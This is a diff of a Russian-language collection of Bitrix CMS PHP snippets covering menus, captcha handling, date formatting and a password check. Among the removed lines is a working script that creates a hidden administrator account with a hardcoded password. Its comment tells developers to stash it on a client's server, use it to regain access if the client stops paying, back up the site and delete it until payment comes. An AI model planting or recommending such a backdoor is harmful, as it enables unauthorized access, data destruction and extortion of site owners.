@@ -10,14 +10,6 @@ require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/footer.php');
 if ($USER->IsAdmin()) {
   echo '<pre>'; print_r($arResult); echo '</pre>';
 }
-// или
-<?php if ($USER->IsAdmin()):?>
-	<pre><?php print_r($arResult);?></pre>
-<?php endif;?>
-
-
-// E-mail администратора
-$adminEmail = COption::GetOptionString('main', 'email_from');
 
 // Всплывающий календарь и занесение даты в поле (без кнопки)?>
 <input type="text" name="date_fld" value="<?echo date(d).".".date(m).".".date(y)?>" onclick="jsCalendar.Show(this, 'date_fld', 'date_fld', '', false, '<?=time()?>','add_cat', true);" />
@@ -35,96 +27,7 @@ $adminEmail = COption::GetOptionString('main', 'email_from');
 );?>
 </div>
 <?
-/*
-Скрипт для создания админской учётной записи
-На тот случай, если клиент оказался настолько козлом, что просто изменил доступы к проекту, не известив вас, а все ваши сообщения просто игнорирует, нам поможет простенький скрипт, который создает админскую учетную запись. Его нужно запрятать куда-нибудь поглубже не фтп, и вызвать в случае обмана вас заказчиком. Таким образом мы вернемся доступ к админке. После чего следует сделать резервную копию, сохранить её себе на комп, а сам сайт на хрен снести до получения оплаты :) Уверяю, клиент объявится сам :) 
-*/
-require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php"); 
-$login = 'superuser'; // Логин
-$password = 'aZi-i8vvAvD[fds'; // Пароль. Делайте со спецсимволами, цифрами и символами верхнего и нижнего регистра, а то не создастся
-$groups = array(1); // ID админской группы. Скорее всего =1
-$email = 'your@email.com'; // Почта. На всякий случай
-
-$user = new CUser;
-$arFields = array(
-  "EMAIL"             => $email,
-  "LOGIN"             => $login,
-  "LID"               => "ru",
-  "ACTIVE"            => "Y",
-  "GROUP_ID"          => $groups,
-  "PASSWORD"          => $password,
-  "CONFIRM_PASSWORD"  => $password
-);
-$ID = $user->Add($arFields);
-if(intval($ID) > 0) echo 'Админ создан';
-else echo $user->LAST_ERROR;
-require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
-
-/*
-Скрипт ничего, НО если в админке будет стоять "использовать каптча при регистрации", то скрипт не добавит пользователя, поэтому предварительно надо отключить соответствующую опцию главного модуля (программно), используя мелод SetOption()
-*/
-
-
-/***** МЕНЮ *****/
-
-// выведем меню типа "top"
-$APPLICATION->IncludeComponent(
-	"bitrix:menu",
-	"horizontal_multilevel",
-	Array(
-		"ROOT_MENU_TYPE" => "top",
-		"MAX_LEVEL" => "3",
-		"CHILD_MENU_TYPE" => "left",
-		"USE_EXT" => "Y"
-	)
-);
-
-// пример файла .left.menu_ext.php (меню разделов инфоблока)
-if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true) die();
-global $APPLICATION;
-$aMenuLinksExt = $APPLICATION->IncludeComponent(
-	"bitrix:menu.sections",
-	"",
-	Array(
-		"ID" => $_REQUEST["ELEMENT_ID"],
-		"IBLOCK_TYPE" => "books",
-		"IBLOCK_ID" => "30",
-		"SECTION_URL" => "/e-store/books/index.php?SECTION_ID=#ID#",
-		"CACHE_TIME" => "3600"
-	)
-);
-$aMenuLinks = array_merge($aMenuLinks, $aMenuLinksExt);
-
-/* КАПЧА */
-// обработка
-require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/classes/general/captcha.php");
-$cptcha = new CCaptcha();
-if(!strlen($_REQUEST["captcha"])>0)
- { echo 'Не введен защитный код'; }
-elseif(!$cptcha -> CheckCode($_REQUEST["captcha"],$_REQUEST["captcha_sid"]))
- { echo 'Неверный код'; }
-else 
- { echo 'true';}
-
-// на страницу
-<?$arResult["CAPTCHA_CODE"] = htmlspecialchars($GLOBALS["APPLICATION"]->CaptchaGetCode());?>
-<?if (true):?>
-	<input type="hidden" name="captcha_sid" value="<?=$arResult["CAPTCHA_CODE"]?>" />
-	<div class="reg_code_img"><img alt="Защитный код" width="200" height="28" src="/bitrix/tools/captcha.php?captcha_code=<?=$arResult["CAPTCHA_CODE"]?>" /></div>
-	<div class="reg_string_sh"><label>Код подтверждения:</label><div class="top_border"><input type="text" name="captcha" /></div></div>
-<?endif;?>
-
-
-	
-/*** ПРОВЕРКА ПАРОЛЯ ПОЛЬЗОВАТЕЛЯ ***/
-<?php
-$pass = $_REQUEST['pass']; // получаем введенный пароль
-$login = CUser::GetLogin(); // получаем логин текущего юзера
-$USERcheck = new CUser;
-$check = $USERcheck->Login($login, $pass, "N", "Y"); // проверяем верный ли пароль
-
-
-// вывод даты в формате Битрикса 
+// вывод даты в формате Битрикса
 echo ConvertTimeStamp();
 
 /*** КОВЕРТАЦИЯ ДАТЫ ИЗ ВИДА '01.01.2013' В ВИД '01 января 2013' ***/
@@ -132,7 +35,7 @@ $arDate = ParseDateTime($arResult["ACTIVE_FROM"], FORMAT_DATETIME);
 $date = $arDate['DD'] . ' ';
 $date .= ToLower(GetMessage('MONTH_'.intval($arDate['MM']).'_S'));
 $date .= ' ' . $arDate['YYYY'];
-?>
+
 
 
 
